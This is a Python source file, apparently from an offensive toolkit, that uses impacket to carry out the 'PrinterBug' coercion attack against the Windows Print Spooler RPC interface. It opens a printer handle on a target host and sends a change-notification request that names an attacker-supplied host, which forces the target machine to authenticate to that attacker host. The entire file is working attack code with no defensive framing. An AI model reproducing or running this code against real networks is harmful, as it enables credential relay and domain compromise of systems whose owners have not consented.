import logging
from impacket.dcerpc.v5 import transport, rprn
from impacket.dcerpc.v5.dtypes import NULL
class PrinterBug(object):
    KNOWN_PROTOCOLS = {
        139: {'bindstr': r'ncacn_np:%s[\pipe\spoolss]', 'set_host': True},
        445: {'bindstr': r'ncacn_np:%s[\pipe\spoolss]', 'set_host': True},
    }

    def __init__(self, username='', password='', domain='', port=None,
                 hashes=None, attackerhost=''):

        self.__username = username
        self.__password = password
        self.__port = port
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__attackerhost = attackerhost
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def dump(self, remote_host):
        logging.info(
            'Attempting to trigger authentication via rprn RPC at %s', remote_host)

        stringbinding = self.KNOWN_PROTOCOLS[self.__port]['bindstr'] % remote_host
        # logging.info('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)

        if self.KNOWN_PROTOCOLS[self.__port]['set_host']:
            rpctransport.setRemoteHost(remote_host)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(
                self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

        try:
            tmp = self.lookup(rpctransport, remote_host)
            if tmp:
                return True
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            return False

    def lookup(self, rpctransport, host):
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
        logging.critical('Bind OK!')
        try:
            resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % host)
        except Exception as e:
            if str(e).find('Broken pipe') >= 0:
                # The connection timed-out. Let's try to bring it back next round
                logging.error('Connection failed - skipping host!')
                return False
            elif str(e).upper().find('ACCESS_DENIED'):
                # We're not admin, bye
                logging.error('Access denied - RPC call was denied')
                dce.disconnect()
                return False
            else:
                return False
        logging.info('Got handle')

        request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
        request['hPrinter'] = resp['pHandle']
        request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
        request['pszLocalMachine'] = '\\\\{}\x00'.format(self.__attackerhost)
        request['pOptions'] = NULL
        try:
            resp = dce.request(request)
        except Exception as e:
            pass

        dce.disconnect()

        return True
